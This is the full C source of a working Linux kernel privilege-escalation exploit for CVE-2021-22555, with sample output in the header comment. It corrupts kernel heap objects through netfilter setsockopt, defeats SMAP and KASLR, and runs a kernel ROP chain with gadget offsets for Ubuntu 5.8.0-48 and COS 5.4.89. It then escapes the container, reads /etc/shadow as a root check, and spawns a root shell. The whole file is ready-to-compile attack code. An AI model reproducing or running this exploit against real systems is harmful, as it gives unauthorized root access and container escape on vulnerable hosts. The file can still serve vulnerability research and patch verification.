/*
 * CVE-2021-22555: Turning \x00\x00 into 10000$
 * by Andy Nguyen (theflow@)
 *
 * theflow@theflow:~$ gcc -m32 -static -o exploit exploit.c
 * theflow@theflow:~$ ./exploit
 * [+] Linux Privilege Escalation by theflow@ - 2021
 *
 * [+] STAGE 0: Initialization
 * [*] Setting up namespace sandbox...
 * [*] Initializing sockets and message queues...
 *
 * [+] STAGE 1: Memory corruption
 * [*] Spraying primary messages...
 * [*] Spraying secondary messages...
 * [*] Creating holes in primary messages...
 * [*] Triggering out-of-bounds write...
 * [*] Searching for corrupted primary message...
 * [+] fake_idx: ffc
 * [+] real_idx: fc4
 *
 * [+] STAGE 2: SMAP bypass
 * [*] Freeing real secondary message...
 * [*] Spraying fake secondary messages...
 * [*] Leaking adjacent secondary message...
 * [+] kheap_addr: ffff91a49cb7f000
 * [*] Freeing fake secondary messages...
 * [*] Spraying fake secondary messages...
 * [*] Leaking primary message...
 * [+] kheap_addr: ffff91a49c7a0000
 *
 * [+] STAGE 3: KASLR bypass
 * [*] Freeing fake secondary messages...
 * [*] Spraying fake secondary messages...
 * [*] Freeing sk_buff data buffer...
 * [*] Spraying pipe_buffer objects...
 * [*] Leaking and freeing pipe_buffer object...
 * [+] anon_pipe_buf_ops: ffffffffa1e78380
 * [+] kbase_addr: ffffffffa0e00000
 *
 * [+] STAGE 4: Kernel code execution
 * [*] Spraying fake pipe_buffer objects...
 * [*] Releasing pipe_buffer objects...
 * [*] Checking for root...
 * [+] Root privileges gained.
 *
 * [+] STAGE 5: Post-exploitation
 * [*] Escaping container...
 * [*] Cleaning up...
 * [*] Popping root shell...
 * root@theflow:/# id
 * uid=0(root) gid=0(root) groups=0(root)
 * root@theflow:/#
 *
 * Exploit tested on Ubuntu 5.8.0-48-generic and COS 5.4.89+.
 */

// clang-format off
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netfilter_ipv4/ip_tables.h>
// clang-format on

#define PAGE_SIZE 0x1000
#define PRIMARY_SIZE 0x1000
#define SECONDARY_SIZE 0x400

#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define NUM_PIPEFDS 256
#define NUM_MSQIDS 4096

#define HOLE_STEP 1024

#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x1337

#define MSG_TAG 0xAAAAAAAA

// #define KERNEL_COS_5_4_89 1
#define KERNEL_UBUNTU_5_8_0_48 1

// clang-format off
#ifdef KERNEL_COS_5_4_89
// 0xffffffff810360f8 : push rax ; jmp qword ptr [rcx]
#define PUSH_RAX_JMP_QWORD_PTR_RCX 0x360F8
// 0xffffffff815401df : pop rsp ; pop rbx ; ret
#define POP_RSP_POP_RBX_RET 0x5401DF

// 0xffffffff816d3a65 : enter 0, 0 ; pop rbx ; pop r14 ; pop rbp ; ret
#define ENTER_0_0_POP_RBX_POP_R14_POP_RBP_RET 0x6D3A65
// 0xffffffff814ddfa8 : mov qword ptr [r14], rbx ; pop rbx ; pop r14 ; pop rbp ; ret
#define MOV_QWORD_PTR_R14_RBX_POP_RBX_POP_R14_POP_RBP_RET 0x4DDFA8
// 0xffffffff81073972 : push qword ptr [rbp + 0x25] ; pop rbp ; ret
#define PUSH_QWORD_PTR_RBP_25_POP_RBP_RET 0x73972
// 0xffffffff8106748c : mov rsp, rbp ; pop rbp ; ret
#define MOV_RSP_RBP_POP_RBP_RET 0x6748C

// 0xffffffff810c7c80 : pop rdx ; ret
#define POP_RDX_RET 0xC7C80
// 0xffffffff8143a2b4 : pop rsi ; ret
#define POP_RSI_RET 0x43A2B4
// 0xffffffff81067520 : pop rdi ; ret
#define POP_RDI_RET 0x67520
// 0xffffffff8100054b : pop rbp ; ret
#define POP_RBP_RET 0x54B

// 0xffffffff812383a6 : mov rdi, rax ; jne 0xffffffff81238396 ; pop rbp ; ret
#define MOV_RDI_RAX_JNE_POP_RBP_RET 0x2383A6
// 0xffffffff815282e1 : cmp rdx, 1 ; jne 0xffffffff8152831d ; pop rbp ; ret
#define CMP_RDX_1_JNE_POP_RBP_RET 0x5282E1

#define FIND_TASK_BY_VPID 0x963C0
#define SWITCH_TASK_NAMESPACES 0x9D080
#define COMMIT_CREDS 0x9EC10
#define PREPARE_KERNEL_CRED 0x9F1F0

#define ANON_PIPE_BUF_OPS 0xE51600
#define INIT_NSPROXY 0x1250590
#elif KERNEL_UBUNTU_5_8_0_48
// 0xffffffff816e9783 : push rsi ; jmp qword ptr [rsi + 0x39]
#define PUSH_RSI_JMP_QWORD_PTR_RSI_39 0x6E9783
// 0xffffffff8109b6c0 : pop rsp ; ret
#define POP_RSP_RET 0x9B6C0
// 0xffffffff8106db59 : add rsp, 0xd0 ; ret
#define ADD_RSP_D0_RET 0x6DB59

// 0xffffffff811a21c3 : enter 0, 0 ; pop rbx ; pop r12 ; pop rbp ; ret
#define ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET 0x1A21C3
// 0xffffffff81084de3 : mov qword ptr [r12], rbx ; pop rbx ; pop r12 ; pop rbp ; ret
#define MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET 0x84DE3
// 0xffffffff816a98ff : push qword ptr [rbp + 0xa] ; pop rbp ; ret
#define PUSH_QWORD_PTR_RBP_A_POP_RBP_RET 0x6A98FF
// 0xffffffff810891bc : mov rsp, rbp ; pop rbp ; ret
#define MOV_RSP_RBP_POP_RBP_RET 0x891BC

// 0xffffffff810f5633 : pop rcx ; ret
#define POP_RCX_RET 0xF5633
// 0xffffffff811abaae : pop rsi ; ret
#define POP_RSI_RET 0x1ABAAE
// 0xffffffff81089250 : pop rdi ; ret
#define POP_RDI_RET 0x89250
// 0xffffffff810005ae : pop rbp ; ret
#define POP_RBP_RET 0x5AE

// 0xffffffff81557894 : mov rdi, rax ; jne 0xffffffff81557888 ; xor eax, eax ; ret
#define MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET 0x557894
// 0xffffffff810724db : cmp rcx, 4 ; jne 0xffffffff810724c0 ; pop rbp ; ret
#define CMP_RCX_4_JNE_POP_RBP_RET 0x724DB

#define FIND_TASK_BY_VPID 0xBFBC0
#define SWITCH_TASK_NAMESPACES 0xC7A50
#define COMMIT_CREDS 0xC8C80
#define PREPARE_KERNEL_CRED 0xC9110

#define ANON_PIPE_BUF_OPS 0x1078380
#define INIT_NSPROXY 0x1663080
#else
#error "No kernel version defined"
#endif
// clang-format on

#define SKB_SHARED_INFO_SIZE 0x140
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))

struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

struct {
  long mtype;
  char mtext[PRIMARY_SIZE - MSG_MSG_SIZE];
} msg_primary;

struct {
  long mtype;
  char mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
} msg_secondary;

struct {
  long mtype;
  char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];
} msg_fake;

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = MTYPE_FAKE;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}

int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) {
  *(long *)msgp = msgtyp;
  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) < 0) {
    perror("[-] msgsnd");
    return -1;
  }
  return 0;
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT) <
      0) {
    perror("[-] msgrcv");
    return -1;
  }
  return 0;
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
    perror("[-] msgrcv");
    return -1;
  }
  return 0;
}

int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        perror("[-] write");
        return -1;
      }
    }
  }
  return 0;
}

int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], buf, size) < 0) {
        perror("[-] read");
        return -1;
      }
    }
  }
  return 0;
}

int trigger_oob_write(int s) {
  struct __attribute__((__packed__)) {
    struct ipt_replace replace;
    struct ipt_entry entry;
    struct xt_entry_match match;
    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
    struct xt_entry_target target;
  } data = {0};

  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                       sizeof(data.pad) + sizeof(data.target));

  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                            sizeof(data.pad) + sizeof(data.target));
  data.entry.target_offset =
      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));

  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
  strcpy(data.match.u.user.name, "icmp");
  data.match.u.user.revision = 0;

  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;

  // Partially overwrite the adjacent buffer with 2 bytes of zero.
  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
    if (errno == ENOPROTOOPT) {
      printf("[-] Error ip_tables module is not loaded.\n");
      return -1;
    }
  }

  return 0;
}

// Note: Must not touch offset 0x10-0x18.
void build_krop(char *buf, uint64_t kbase_addr, uint64_t scratchpad_addr) {
  uint64_t *rop;
#ifdef KERNEL_COS_5_4_89
  *(uint64_t *)&buf[0x00] = kbase_addr + POP_RSP_POP_RBX_RET;

  rop = (uint64_t *)&buf[0x18];

  // Save RBP at scratchpad_addr.
  *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R14_POP_RBP_RET;
  *rop++ = scratchpad_addr; // R14
  *rop++ = 0xDEADBEEF;      // RBP
  *rop++ = kbase_addr + MOV_QWORD_PTR_R14_RBX_POP_RBX_POP_R14_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBX
  *rop++ = 0xDEADBEEF; // R14
  *rop++ = 0xDEADBEEF; // RBP

  // commit_creds(prepare_kernel_cred(NULL))
  *rop++ = kbase_addr + POP_RDI_RET;
  *rop++ = 0; // RDI
  *rop++ = kbase_addr + PREPARE_KERNEL_CRED;
  *rop++ = kbase_addr + POP_RDX_RET;
  *rop++ = 1; // RDX
  *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + COMMIT_CREDS;

  // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
  *rop++ = kbase_addr + POP_RDI_RET;
  *rop++ = 1; // RDI
  *rop++ = kbase_addr + FIND_TASK_BY_VPID;
  *rop++ = kbase_addr + POP_RDX_RET;
  *rop++ = 1; // RDX
  *rop++ = kbase_addr + CMP_RDX_1_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + POP_RSI_RET;
  *rop++ = kbase_addr + INIT_NSPROXY; // RSI
  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;

  // Load RBP from scratchpad_addr and resume execution.
  *rop++ = kbase_addr + POP_RBP_RET;
  *rop++ = scratchpad_addr - 0x25; // RBP
  *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_25_POP_RBP_RET;
  *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;
#elif KERNEL_UBUNTU_5_8_0_48
  *(uint64_t *)&buf[0x39] = kbase_addr + POP_RSP_RET;
  *(uint64_t *)&buf[0x00] = kbase_addr + ADD_RSP_D0_RET;

  rop = (uint64_t *)&buf[0xD8];

  // Save RBP at scratchpad_addr.
  *rop++ = kbase_addr + ENTER_0_0_POP_RBX_POP_R12_POP_RBP_RET;
  *rop++ = scratchpad_addr; // R12
  *rop++ = 0xDEADBEEF;      // RBP
  *rop++ = kbase_addr + MOV_QWORD_PTR_R12_RBX_POP_RBX_POP_R12_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBX
  *rop++ = 0xDEADBEEF; // R12
  *rop++ = 0xDEADBEEF; // RBP

  // commit_creds(prepare_kernel_cred(NULL))
  *rop++ = kbase_addr + POP_RDI_RET;
  *rop++ = 0; // RDI
  *rop++ = kbase_addr + PREPARE_KERNEL_CRED;
  *rop++ = kbase_addr + POP_RCX_RET;
  *rop++ = 4; // RCX
  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
  *rop++ = kbase_addr + COMMIT_CREDS;

  // switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
  *rop++ = kbase_addr + POP_RDI_RET;
  *rop++ = 1; // RDI
  *rop++ = kbase_addr + FIND_TASK_BY_VPID;
  *rop++ = kbase_addr + POP_RCX_RET;
  *rop++ = 4; // RCX
  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;
  *rop++ = 0xDEADBEEF; // RBP
  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
  *rop++ = kbase_addr + POP_RSI_RET;
  *rop++ = kbase_addr + INIT_NSPROXY; // RSI
  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;

  // Load RBP from scratchpad_addr and resume execution.
  *rop++ = kbase_addr + POP_RBP_RET;
  *rop++ = scratchpad_addr - 0xA; // RBP
  *rop++ = kbase_addr + PUSH_QWORD_PTR_RBP_A_POP_RBP_RET;
  *rop++ = kbase_addr + MOV_RSP_RBP_POP_RBP_RET;
#endif
}

int setup_sandbox(void) {
  if (unshare(CLONE_NEWUSER) < 0) {
    perror("[-] unshare(CLONE_NEWUSER)");
    return -1;
  }
  if (unshare(CLONE_NEWNET) < 0) {
    perror("[-] unshare(CLONE_NEWNET)");
    return -1;
  }

  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
    perror("[-] sched_setaffinity");
    return -1;
  }

  return 0;
}

int main(int argc, char *argv[]) {
  int s;
  int fd;
  int ss[NUM_SOCKETS][2];
  int pipefd[NUM_PIPEFDS][2];
  int msqid[NUM_MSQIDS];

  char primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];
  char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];

  struct msg_msg *msg;
  struct pipe_buf_operations *ops;
  struct pipe_buffer *buf;

  uint64_t pipe_buffer_ops = 0;
  uint64_t kheap_addr = 0, kbase_addr = 0;

  int fake_idx = -1, real_idx = -1;

  printf("[+] Linux Privilege Escalation by theflow@ - 2021\n");

  printf("\n");
  printf("[+] STAGE 0: Initialization\n");

  printf("[*] Setting up namespace sandbox...\n");
  if (setup_sandbox() < 0)
    goto err_no_rmid;

  printf("[*] Initializing sockets and message queues...\n");

  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror("[-] socket");
    goto err_no_rmid;
  }

  for (int i = 0; i < NUM_SOCKETS; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
      perror("[-] socketpair");
      goto err_no_rmid;
    }
  }

  for (int i = 0; i < NUM_MSQIDS; i++) {
    if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
      perror("[-] msgget");
      goto err_no_rmid;
    }
  }

  printf("\n");
  printf("[+] STAGE 1: Memory corruption\n");

  printf("[*] Spraying primary messages...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    memset(&msg_primary, 0, sizeof(msg_primary));
    *(int *)&msg_primary.mtext[0] = MSG_TAG;
    *(int *)&msg_primary.mtext[4] = i;
    if (write_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <
        0)
      goto err_rmid;
  }

  printf("[*] Spraying secondary messages...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    memset(&msg_secondary, 0, sizeof(msg_secondary));
    *(int *)&msg_secondary.mtext[0] = MSG_TAG;
    *(int *)&msg_secondary.mtext[4] = i;
    if (write_msg(msqid[i], &msg_secondary, sizeof(msg_secondary),
                  MTYPE_SECONDARY) < 0)
      goto err_rmid;
  }

  printf("[*] Creating holes in primary messages...\n");
  for (int i = HOLE_STEP; i < NUM_MSQIDS; i += HOLE_STEP) {
    if (read_msg(msqid[i], &msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) <
        0)
      goto err_rmid;
  }

  printf("[*] Triggering out-of-bounds write...\n");
  if (trigger_oob_write(s) < 0)
    goto err_rmid;

  printf("[*] Searching for corrupted primary message...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    if (i != 0 && (i % HOLE_STEP) == 0)
      continue;
    if (peek_msg(msqid[i], &msg_secondary, sizeof(msg_secondary), 1) < 0)
      goto err_no_rmid;
    if (*(int *)&msg_secondary.mtext[0] != MSG_TAG) {
      printf("[-] Error could not corrupt any primary message.\n");
      goto err_no_rmid;
    }
    if (*(int *)&msg_secondary.mtext[4] != i) {
      fake_idx = i;
      real_idx = *(int *)&msg_secondary.mtext[4];
      break;
    }
  }

  if (fake_idx == -1 && real_idx == -1) {
    printf("[-] Error could not corrupt any primary message.\n");
    goto err_no_rmid;
  }

  // fake_idx's primary message has a corrupted next pointer; wrongly
  // pointing to real_idx's secondary message.
  printf("[+] fake_idx: %x\n", fake_idx);
  printf("[+] real_idx: %x\n", real_idx);

  printf("\n");
  printf("[+] STAGE 2: SMAP bypass\n");

  printf("[*] Freeing real secondary message...\n");
  if (read_msg(msqid[real_idx], &msg_secondary, sizeof(msg_secondary),
               MTYPE_SECONDARY) < 0)
    goto err_rmid;

  // Reclaim the previously freed secondary message with a fake msg_msg of
  // maximum possible size.
  printf("[*] Spraying fake secondary messages...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                PAGE_SIZE - MSG_MSG_SIZE, 0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  // Use the fake secondary message to read out-of-bounds.
  printf("[*] Leaking adjacent secondary message...\n");
  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
    goto err_rmid;

  // Check if the leak is valid.
  if (*(int *)&msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) {
    printf("[-] Error could not leak adjacent secondary message.\n");
    goto err_rmid;
  }

  // The secondary message contains a pointer to the primary message.
  msg = (struct msg_msg *)&msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
  kheap_addr = msg->m_list_next;
  if (kheap_addr & (PRIMARY_SIZE - 1))
    kheap_addr = msg->m_list_prev;
  printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);

  if ((kheap_addr & 0xFFFF000000000000) != 0xFFFF000000000000) {
    printf("[-] Error kernel heap address is incorrect.\n");
    goto err_rmid;
  }

  printf("[*] Freeing fake secondary messages...\n");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  // Put kheap_addr at next to leak its content. Assumes zero bytes before
  // kheap_addr.
  printf("[*] Spraying fake secondary messages...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                sizeof(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  // Use the fake secondary message to read from kheap_addr.
  printf("[*] Leaking primary message...\n");
  if (peek_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), 1) < 0)
    goto err_rmid;

  // Check if the leak is valid.
  if (*(int *)&msg_fake.mtext[PAGE_SIZE] != MSG_TAG) {
    printf("[-] Error could not leak primary message.\n");
    goto err_rmid;
  }

  // The primary message contains a pointer to the secondary message.
  msg = (struct msg_msg *)&msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];
  kheap_addr = msg->m_list_next;
  if (kheap_addr & (SECONDARY_SIZE - 1))
    kheap_addr = msg->m_list_prev;

  // Calculate the address of the fake secondary message.
  kheap_addr -= SECONDARY_SIZE;
  printf("[+] kheap_addr: %" PRIx64 "\n", kheap_addr);

  if ((kheap_addr & 0xFFFF00000000FFFF) != 0xFFFF000000000000) {
    printf("[-] Error kernel heap address is incorrect.\n");
    goto err_rmid;
  }

  printf("\n");
  printf("[+] STAGE 3: KASLR bypass\n");

  printf("[*] Freeing fake secondary messages...\n");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  // Put kheap_addr at m_list_next & m_list_prev so that list_del() is possible.
  printf("[*] Spraying fake secondary messages...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, kheap_addr, kheap_addr, 0, 0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  printf("[*] Freeing sk_buff data buffer...\n");
  if (read_msg(msqid[fake_idx], &msg_fake, sizeof(msg_fake), MTYPE_FAKE) < 0)
    goto err_rmid;

  printf("[*] Spraying pipe_buffer objects...\n");
  for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (pipe(pipefd[i]) < 0) {
      perror("[-] pipe");
      goto err_rmid;
    }
    // Write something to populate pipe_buffer.
    if (write(pipefd[i][1], "pwn", 3) < 0) {
      perror("[-] write");
      goto err_rmid;
    }
  }

  printf("[*] Leaking and freeing pipe_buffer object...\n");
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
        perror("[-] read");
        goto err_rmid;
      }
      if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)
        pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];
    }
  }

  kbase_addr = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
  printf("[+] anon_pipe_buf_ops: %" PRIx64 "\n", pipe_buffer_ops);
  printf("[+] kbase_addr: %" PRIx64 "\n", kbase_addr);

  if ((kbase_addr & 0xFFFF0000000FFFFF) != 0xFFFF000000000000) {
    printf("[-] Error kernel base address is incorrect.\n");
    goto err_rmid;
  }

  printf("\n");
  printf("[+] STAGE 4: Kernel code execution\n");

  printf("[*] Spraying fake pipe_buffer objects...\n");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  buf = (struct pipe_buffer *)&secondary_buf;
  buf->ops = kheap_addr + 0x290;
  ops = (struct pipe_buf_operations *)&secondary_buf[0x290];
#ifdef KERNEL_COS_5_4_89
  // RAX points to &buf->ops.
  // RCX points to &buf.
  ops->release = kbase_addr + PUSH_RAX_JMP_QWORD_PTR_RCX;
#elif KERNEL_UBUNTU_5_8_0_48
  // RSI points to &buf.
  ops->release = kbase_addr + PUSH_RSI_JMP_QWORD_PTR_RSI_39;
#endif
  build_krop(secondary_buf, kbase_addr, kheap_addr + 0x2B0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    goto err_rmid;

  // Trigger pipe_release().
  printf("[*] Releasing pipe_buffer objects...\n");
  for (int i = 0; i < NUM_PIPEFDS; i++) {
    if (close(pipefd[i][0]) < 0) {
      perror("[-] close");
      goto err_rmid;
    }
    if (close(pipefd[i][1]) < 0) {
      perror("[-] close");
      goto err_rmid;
    }
  }

  printf("[*] Checking for root...\n");
  if ((fd = open("/etc/shadow", O_RDONLY)) < 0) {
    printf("[-] Error could not gain root privileges.\n");
    goto err_rmid;
  }
  close(fd);
  printf("[+] Root privileges gained.\n");

  printf("\n");
  printf("[+] STAGE 5: Post-exploitation\n");

  printf("[*] Escaping container...\n");
  setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
  setns(open("/proc/1/ns/pid", O_RDONLY), 0);
  setns(open("/proc/1/ns/net", O_RDONLY), 0);

  printf("[*] Cleaning up...\n");
  for (int i = 0; i < NUM_MSQIDS; i++) {
    // TODO: Fix next pointer.
    if (i == fake_idx)
      continue;
    if (msgctl(msqid[i], IPC_RMID, NULL) < 0)
      perror("[-] msgctl");
  }
  for (int i = 0; i < NUM_SOCKETS; i++) {
    if (close(ss[i][0]) < 0)
      perror("[-] close");
    if (close(ss[i][1]) < 0)
      perror("[-] close");
  }
  if (close(s) < 0)
    perror("[-] close");

  printf("[*] Popping root shell...\n");
  char *args[] = {"/bin/bash", "-i", NULL};
  execve(args[0], args, NULL);

  return 0;

err_rmid:
  for (int i = 0; i < NUM_MSQIDS; i++) {
    if (i == fake_idx)
      continue;
    if (msgctl(msqid[i], IPC_RMID, NULL) < 0)
      perror("[-] msgctl");
  }

err_no_rmid:
  return 1;
}